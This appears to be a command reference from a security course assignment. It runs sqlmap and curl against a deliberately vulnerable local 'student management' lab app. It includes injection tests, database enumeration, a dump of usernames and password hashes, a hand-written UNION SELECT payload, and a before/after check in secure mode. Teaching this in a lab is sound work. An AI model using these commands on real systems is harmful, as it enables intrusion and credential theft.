# sqlmap Command Reference

> Run these only against your own local `http://localhost:8080` lab instance with
> `APP_MODE=vulnerable`. All data is fictional seed data created for this project.

First, log in through a browser (or curl) and grab your session cookie, since every
page requires authentication:

```bash
curl -s -c cookies.txt -X POST http://localhost:8080/login.php \
  -d "username=jsmith&password=password123" -o /dev/null
# cookies.txt now holds a valid PHPSESSID
```

Convert `cookies.txt` into a `Cookie:` header value for sqlmap, e.g.:
```
PHPSESSID=<value from cookies.txt>
```

---

## 1. Test a vulnerable parameter (students.php `q`)

```bash
sqlmap -u "http://localhost:8080/students.php?q=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch --level=3 --risk=2
```

## 2. Test the student-details `id` parameter

```bash
sqlmap -u "http://localhost:8080/student.php?id=1" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch --level=3 --risk=2
```

## 3. Test the login form (POST body injection)

```bash
sqlmap -u "http://localhost:8080/login.php" \
  --data="username=test&password=test" \
  -p username \
  --batch --level=3 --risk=2
```
(The login endpoint is most useful for boolean-blind detection: sqlmap should
notice different response bodies for the true/false injected conditions because
of the account-enumeration error-message difference documented in
`docs/vulnerabilities.md`.)

---

## 4. Enumerate databases

```bash
sqlmap -u "http://localhost:8080/students.php?q=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch --dbs
```

## 5. Enumerate tables in `student_management_lab`

```bash
sqlmap -u "http://localhost:8080/students.php?q=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch -D student_management_lab --tables
```

## 6. Extract usernames and password hashes from the `users` table

```bash
sqlmap -u "http://localhost:8080/students.php?q=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch -D student_management_lab -T users -C username,password_hash,plain_password --dump
```

## 7. Extract the current database user (impact of SQLi)

```bash
sqlmap -u "http://localhost:8080/students.php?q=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch --current-user --current-db --privileges
```
Expected: the current DB user is `labapp_user`, scoped only to
`student_management_lab` — document this as a *positive* finding (the app does
not run as `root`/with excessive privileges), separate from the SQLi
vulnerability itself.

---

## 8. Manual UNION-based proof (no sqlmap required)

Useful as a quick manual sanity check before/alongside sqlmap:

```bash
curl -s -b cookies.txt -G "http://localhost:8080/students.php" \
  --data-urlencode "q=nomatch' UNION SELECT 1,username,password_hash,role,2 FROM users-- -"
```
This returns an HTML table whose rows are actually `users` records
(`student_code` = username, `full_name` = password hash, `major` = role).

---

## 9. Demonstrating the fix (secure mode)

Switch the app to secure mode and re-run any of the commands above:

```bash
# in .env: APP_MODE=secure
docker compose up -d --build app
sqlmap -u "http://localhost:8080/students.php?q=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch --level=5 --risk=3
```
sqlmap should report **no injectable parameters found** — document this
"before vs. after" result pair for the assignment report.
